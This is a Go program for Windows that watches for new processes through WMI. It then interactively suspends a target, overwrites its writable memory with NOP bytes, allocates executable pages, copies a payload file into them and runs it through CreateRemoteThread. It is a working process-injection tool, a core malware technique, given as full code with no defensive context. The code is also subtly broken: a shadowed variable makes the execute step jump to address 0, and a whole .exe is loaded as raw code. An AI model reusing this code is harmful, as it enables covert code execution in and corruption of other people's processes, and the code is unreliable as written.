package main

import (
	"fmt"
	"log"
	"syscall"
	"unsafe"
	"errors"
	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
)

const (
	PROCESS_CREATE_THREAD          = 0x0002
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_SUSPEND_RESUME    = 0x0800
	PROCESS_QUERY_INFORMATION = 0x0400
	MEM_COMMIT                = 0x00001000
    MEM_RESERVE				  = 0x00002000
    MEM_RELEASE				  = 0x00008000
	PAGE_READWRITE            = 0x04
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	modntdll             = syscall.NewLazyDLL("ntdll.dll")
	procNtSuspendProcess = modntdll.NewProc("NtSuspendProcess")
	procNtResumeProcess  = modntdll.NewProc("NtResumeProcess")
	kernel32             = syscall.NewLazyDLL("kernel32.dll")
	procVirtualQueryEx   = kernel32.NewProc("VirtualQueryEx")
	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
    procVirtualAllocEx      = kernel32.NewProc("VirtualAllocEx")
    procVirtualFreeEx       = kernel32.NewProc("VirtualFreeEx")
    procVirtualProtectEx = kernel32.NewProc("VirtualProtectEx")
)

type MEMORY_BASIC_INFORMATION struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	RegionSize        uintptr
	State             uint32
	Protect           uint32
	Type              uint32
}

func SuspendProcess(pid uint32) error {
	hProcess, err := syscall.OpenProcess(PROCESS_SUSPEND_RESUME, false, pid)
	if err != nil {
		return err
	}
	defer syscall.CloseHandle(hProcess)

	_, _, err = procNtSuspendProcess.Call(uintptr(hProcess))
	if err != syscall.Errno(0) {
		return err
	}
	return nil
}

func ResumeProcess(pid uint32) error {
	hProcess, err := syscall.OpenProcess(PROCESS_SUSPEND_RESUME, false, pid)
	if err != nil {
		return err
	}
	defer syscall.CloseHandle(hProcess)

	_, _, err = procNtResumeProcess.Call(uintptr(hProcess))
	if err != syscall.Errno(0) {
		return err
	}
	return nil
}

func VirtualQueryEx(hProcess syscall.Handle, lpAddress uintptr, mbi *MEMORY_BASIC_INFORMATION) (uintptr, error) {
	ret, _, err := procVirtualQueryEx.Call(uintptr(hProcess), lpAddress, uintptr(unsafe.Pointer(mbi)), unsafe.Sizeof(*mbi))
	return ret, err
}

func WriteProcessMemory(hProcess syscall.Handle, lpBaseAddress uintptr, lpBuffer unsafe.Pointer, nSize uintptr, lpNumberOfBytesWritten *uint32) (bool, uint32) {
	ret, _, err := procWriteProcessMemory.Call(uintptr(hProcess), lpBaseAddress, uintptr(lpBuffer), nSize, uintptr(
	unsafe.Pointer(lpNumberOfBytesWritten)))
	if ret == 0 {
		return false, uint32(err.(syscall.Errno))
	}
	return true, 0
}

func RewriteProcessMemory(pid uint32) error {
    hProcess, err := syscall.OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION, false, pid)
    if err != nil {
        return err
    }
    defer syscall.CloseHandle(hProcess)

    var mbi MEMORY_BASIC_INFORMATION
    var address uintptr
    totalBytesWritten := uint32(0)

    for {
        ret, err := VirtualQueryEx(hProcess, address, &mbi)
        if ret == 0 {
            if err != nil {
                log.Printf("VirtualQueryEx failed: %v", err)
            }
            break
        }

        if mbi.State == MEM_COMMIT && (mbi.Protect&PAGE_READWRITE != 0 || mbi.Protect&PAGE_EXECUTE_READWRITE != 0) {
            code := make([]byte, mbi.RegionSize)
            for i := range code {
                code[i] = 0x90 // NOP instruction
            }

            var nBytesWritten uint32
            success, errCode := WriteProcessMemory(hProcess, address, unsafe.Pointer(&code[0]), uintptr(len(code)), &nBytesWritten)
            if !success {
                if errCode == 299 { // ERROR_PARTIAL_COPY
                    log.Printf("Skipping memory region at address %#x due to ERROR_PARTIAL_COPY\n", address)
                } else {
                    return fmt.Errorf("failed to write memory at address %#x, error code: %d", address, errCode)
                }
            } else {
                totalBytesWritten += nBytesWritten
            }
        }

        address = uintptr(unsafe.Pointer(mbi.BaseAddress)) + uintptr(mbi.RegionSize)
    }
    fmt.Printf("Wrote %d bytes of NOP instructions to process memory\n", totalBytesWritten)
    return nil
}

func AddNOPCodePage(pid uint32) error {
	hProcess, err := syscall.OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION, false, pid)
	if err != nil {
		return err
	}
	defer syscall.CloseHandle(hProcess)
	// Allocate memory in the target process
	const size = 1024 // Size of memory to allocate (1024 bytes)
	lpBaseAddress, err := VirtualAllocEx(hProcess, 0, size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		return fmt.Errorf("VirtualAllocEx failed: %v", err)
	}
	if lpBaseAddress == 0 {
		return errors.New("failed to allocate memory in target process")
	}

	// Create a buffer with NOP instructions
	nopBuffer := make([]byte, size)
	for i := range nopBuffer {
		nopBuffer[i] = 0x90 // NOP instruction
	}

	// Write the NOP instructions to the allocated memory
	var nBytesWritten uint32
	success, errCode := WriteProcessMemory(hProcess, lpBaseAddress, unsafe.Pointer(&nopBuffer[0]), size, &nBytesWritten)
	if !success {
		VirtualFreeEx(hProcess, lpBaseAddress, 0, MEM_RELEASE) // Cleanup
		return fmt.Errorf("failed to write NOP instructions, error code: %d", errCode)
	}

	fmt.Printf("Allocated and wrote %d bytes of NOP instructions to process memory at address %#x\n", nBytesWritten, lpBaseAddress)
	return nil
}

func VirtualAllocEx(hProcess syscall.Handle, lpAddress uintptr, dwSize uintptr, flAllocationType uint32, flProtect uint32) (uintptr, error) {
    ret, _, err := procVirtualAllocEx.Call(
        uintptr(hProcess),
        lpAddress,
        dwSize,
        uintptr(flAllocationType),
        uintptr(flProtect),
    )
    if ret == 0 {
        return 0, err
    }
    return ret, nil
}

func VirtualFreeEx(hProcess syscall.Handle, lpAddress uintptr, dwSize uintptr, dwFreeType uint32) error {
    ret, _, err := procVirtualFreeEx.Call(
        uintptr(hProcess),
        lpAddress,
        dwSize,
        uintptr(dwFreeType),
    )
    if ret == 0 {
        return err
    }
    return nil
}

func AddCodePageFromFile(pid uint32, filePath string) (uintptr, error) {
    hProcess, err := syscall.OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION, false, pid)
    if err != nil {
        return 0, err
    }
    defer syscall.CloseHandle(hProcess)

    // Read the code from the file
    code, err := readFileContents(filePath)
    if err != nil {
        return 0, fmt.Errorf("Failed to read code from file: %v", err)
    }

    // Allocate memory in the target process
    size := len(code)
    lpBaseAddress, err := VirtualAllocEx(hProcess, 0, uintptr(uint32(size)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) // Set initial protection to PAGE_READWRITE
    if err != nil {
        return 0, fmt.Errorf("VirtualAllocEx failed: %v", err)
    }
    if lpBaseAddress == 0 {
        return 0, errors.New("failed to allocate memory in the target process")
    }

    // Write the code to the allocated memory
    var nBytesWritten uint32
    success, errCode := WriteProcessMemory(hProcess, lpBaseAddress, unsafe.Pointer(&code[0]), uintptr(uint32(size)), &nBytesWritten)
    if !success {
        VirtualFreeEx(hProcess, lpBaseAddress, 0, MEM_RELEASE) // Cleanup
        return 0, fmt.Errorf("failed to write code to process memory, error code: %d", errCode)
    }

    // Set the memory protection to PAGE_EXECUTE_READWRITE to allow execution
    oldProtect := uint32(0)
    ret, _, err := procVirtualProtectEx.Call(uintptr(hProcess), lpBaseAddress, uintptr(uint32(size)), PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
    if ret == 0 {
        VirtualFreeEx(hProcess, lpBaseAddress, 0, MEM_RELEASE) // Cleanup
        return 0, fmt.Errorf("VirtualProtectEx failed: %v", err)
    }

    fmt.Printf("Allocated and wrote %d bytes of code to process memory at address %#x\n", nBytesWritten, lpBaseAddress)
    return lpBaseAddress, nil
}

func readFileContents(filePath string) ([]byte, error) {
	content, err := syscall.UTF16PtrFromString(filePath)
	if err != nil {
		return nil, err
	}
	handle, err := syscall.CreateFile(content, syscall.GENERIC_READ, 0, nil, syscall.OPEN_EXISTING, syscall.FILE_ATTRIBUTE_NORMAL, 0)
	if err != nil {
		return nil, err
	}
	defer syscall.CloseHandle(handle)

	const maxFileSize = 1024 * 1024 // Maximum file size to read (1 MB)
	buffer := make([]byte, maxFileSize)
	var bytesRead uint32
	err = syscall.ReadFile(handle, buffer, &bytesRead, nil)
	if err != nil {
		return nil, err
	}

	return buffer[:bytesRead], nil
}

func ExecuteCodePage(processID uint32, codePageAddress uintptr) error {
    // Open the target process
    hProcess, err := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION, false, processID)
    if err != nil {
        return err
    }
    defer syscall.CloseHandle(hProcess)

    // Create a remote thread in the target process to execute the code
    hThread, err := createRemoteThread(hProcess, codePageAddress)
    if err != nil {
        return fmt.Errorf("CreateRemoteThread failed: %v", err)
    }
    defer syscall.CloseHandle(hThread)

    // Wait for the remote thread to finish
    _, err = syscall.WaitForSingleObject(hThread, syscall.INFINITE)
    if err != nil {
        return fmt.Errorf("WaitForSingleObject failed: %v", err)
    }

    return nil
}

func createRemoteThread(hProcess syscall.Handle, codePageAddress uintptr) (syscall.Handle, error) {
    const (
        THREAD_ALL_ACCESS = 0x1F03FF
    )

    threadHandle, _, err := syscall.Syscall6(
        uintptr(kernel32.NewProc("CreateRemoteThread").Addr()),
        6,
        uintptr(hProcess),
        0,
        0,
        codePageAddress,
        0,
        0,
    )

    if threadHandle == 0 {
        return syscall.Handle(0), err
    }

    return syscall.Handle(threadHandle), nil
}


func main() {
	// Initialize OLE
	err := ole.CoInitialize(0)
	if err != nil {
		log.Fatal(err)
	}
	defer ole.CoUninitialize()
	unknown, err := oleutil.CreateObject("WbemScripting.SWbemLocator")
	if err != nil {
		log.Fatal(err)
	}
	defer unknown.Release()

	wmi, err := unknown.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		log.Fatal(err)
	}
	defer wmi.Release()

	serviceRaw, err := oleutil.CallMethod(wmi, "ConnectServer")
	if err != nil {
		log.Fatal(err)
	}
	service := serviceRaw.ToIDispatch()
	defer service.Release()

	// Execute a WMI query
	query := "SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process'"
	resultRaw, err := oleutil.CallMethod(service, "ExecNotificationQuery", query)
	if err != nil {
		log.Fatal(err)
	}
	result := resultRaw.ToIDispatch()
	defer result.Release()

	var response string

	// Retrieve the event
	for {
		eventRaw, err := oleutil.CallMethod(result, "NextEvent", -1) // -1 for INFINITE
		if err != nil {
			log.Fatal(err)
		}
		event := eventRaw.ToIDispatch()
		defer event.Release()
		processRaw := oleutil.MustGetProperty(event, "TargetInstance")
		process := processRaw.ToIDispatch()
		defer process.Release()

		processIDVariant := oleutil.MustGetProperty(process, "ProcessId")
		processID := uint32(processIDVariant.Val)

		processName := oleutil.MustGetProperty(process, "Name")
		fmt.Println("Process created:", processName.ToString())

		// User prompt for suspending process
		fmt.Print("Do you want to suspend the process? [Y/N]: ")
		_, err = fmt.Scanln(&response)
		if err != nil {
			log.Fatal("Failed to read input:", err)
		}

		if response == "Y" || response == "y" {
			err := SuspendProcess(processID)
			if err != nil {
				log.Printf("Failed to suspend process %d: %v", processID, err)
			} else {
				fmt.Println("Process suspended.")
				// User prompt for rewriting the process memory
				fmt.Print("Do you want to rewrite the process memory w/ NOPCodePage? [Y/N]: ")
				_, err = fmt.Scanln(&response)
				if err != nil {
					log.Fatal("Failed to read input:", err)
				}

				if response == "Y" || response == "y" {
					err := RewriteProcessMemory(processID)
					if err != nil {
						log.Printf("Failed to rewrite process w/ NOPCodePage %d: %v", processID, err)
					} else {
						fmt.Println("Process memory rewritten w/ NOPCodePage.")
					}
				} else {
					fmt.Println("Not rewriting the process memory w/ NOPCodePage.")
				}

				// User prompt for appending the process memory w/ NOPCodePage?
				fmt.Print("Do you want to append the process memory w/ NOPCodePage? [Y/N]: ")
				_, err = fmt.Scanln(&response)
				if err != nil {
					log.Fatal("Failed to read input:", err)
				}

				if response == "Y" || response == "y" {
					err := AddNOPCodePage(processID)
					if err != nil {
						log.Printf("Failed to append process w/ NOPCodePage %d: %v", processID, err)
					} else {
						fmt.Println("Process memory appended w/ NOPCodePage.")
					}
				} else {
					fmt.Println("Not appending the process memory w/ NOPCodePage.")
				}

				var codePageAddress uintptr // Variable to store the code page memory address
				// User prompt for appending the process memory w/ W32API HelloWorld?
				fmt.Print("Do you want to append the process memory w/ W32API HelloWorld? [Y/N]: ")
				_, err = fmt.Scanln(&response)
				if err != nil {
					log.Fatal("Failed to read input:", err)
				}

				if response == "Y" || response == "y" {
					filePath := "asm/x64/payload.exe"
					codePageAddress, err := AddCodePageFromFile(processID, filePath)
					fmt.Println(codePageAddress)
					if err != nil {
						log.Printf("Failed to rewrite process w/ W32API HelloWorld %d: %v", processID, err)
					} else {
						fmt.Println("Process memory appended w/ W32API HelloWorld.")
					}
				} else {
					fmt.Println("Not appending the process memory w/ W32API HelloWorld.")
				}

				// User prompt for resuming process
				fmt.Print("Do you want to resume the process? [Y/N]: ")
				_, err = fmt.Scanln(&response)
				if err != nil {
					log.Fatal("Failed to read input:", err)
				}

				if response == "Y" || response == "y" {
					err := ResumeProcess(processID)
					if err != nil {
						log.Printf("Failed to resume process %d: %v", processID, err)
					} else {
						fmt.Println("Process resumed.")


						// After resuming the process, ask the user if they want to execute the new code page
						fmt.Print("Do you want to execute the new code page? [Y/N]: ")
						_, err = fmt.Scanln(&response)
						if err != nil {
							log.Fatal("Failed to read input:", err)
						}

						if response == "Y" || response == "y" {
							// Execute the code page at codePageAddress within foreign process
							err := ExecuteCodePage(processID, codePageAddress)
							if err != nil {
								fmt.Println("Failed to execute code page")
							} else {
								fmt.Println("Code page executed")
							}
						} else {
							fmt.Println("Not executing the new code page.")
						}

					}
				} else {
					fmt.Println("Not resuming the process.")
				}
			}
		} else {
			fmt.Println("Not suspending the process.")
		}

		
	}
}
